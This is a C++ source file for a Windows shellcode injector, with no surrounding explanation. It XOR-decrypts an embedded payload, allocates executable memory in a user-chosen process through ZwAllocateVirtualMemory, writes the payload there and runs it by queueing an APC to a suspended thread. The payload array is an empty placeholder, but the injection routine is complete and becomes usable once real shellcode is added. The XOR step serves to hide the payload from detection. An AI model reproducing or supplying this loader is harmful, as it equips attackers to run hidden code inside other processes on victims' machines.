#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <memory>

using namespace std;

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef NTSTATUS(NTAPI* pZwAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

unsigned char encryptedShellcode[] = { 0x00 };
SIZE_T shellcodeSize = sizeof(encryptedShellcode);

#define XOR_KEY 0xAA  

void xorDecrypt(unsigned char* data, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; ++i) {
        data[i] ^= key;
    }
}

bool InjectShellcode(HANDLE hProcess, const vector<BYTE>& shellcode) {
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        return false;
    }

    pZwAllocateVirtualMemory ZwAllocateVirtualMemory = (pZwAllocateVirtualMemory)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
    if (!ZwAllocateVirtualMemory) {
        return false;
    }

    PVOID remoteMem = nullptr;
    SIZE_T allocSize = shellcode.size();
    NTSTATUS status = ZwAllocateVirtualMemory(
        hProcess,
        &remoteMem,
        0,              
        &allocSize,     
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE 
    );
    if (status != STATUS_SUCCESS) {
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, shellcode.data(), shellcode.size(), nullptr)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    HANDLE hTargetThread = nullptr;

    DWORD pid = GetProcessId(hProcess);
    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                hTargetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                if (hTargetThread) {
                    if (SuspendThread(hTargetThread) != (DWORD)-1) {
                        break;
                    }
                    CloseHandle(hTargetThread);
                    hTargetThread = nullptr;
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);

    if (!hTargetThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }

    if (!QueueUserAPC((PAPCFUNC)remoteMem, hTargetThread, (ULONG_PTR)nullptr)) {
        ResumeThread(hTargetThread);
        CloseHandle(hTargetThread);
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }

    ResumeThread(hTargetThread);
    CloseHandle(hTargetThread);

    cout << "[+] Shellcode successfully injected at address: 0x" << hex << remoteMem << endl;
    return true;
}

int main() {
    DWORD pid;
    cout << "[?] Enter target PID: ";
    cin >> pid;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return 1;
    }

    vector<BYTE> decryptedShellcode(encryptedShellcode, encryptedShellcode + shellcodeSize);
    xorDecrypt(decryptedShellcode.data(), decryptedShellcode.size(), XOR_KEY);

    if (decryptedShellcode.empty() || decryptedShellcode.size() < 4) {
        CloseHandle(hProcess);
        return 1;
    }

    if (!InjectShellcode(hProcess, decryptedShellcode)) {
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hProcess);
    cout << "[+] Injection completed successfully!" << endl;
    return 0;
}

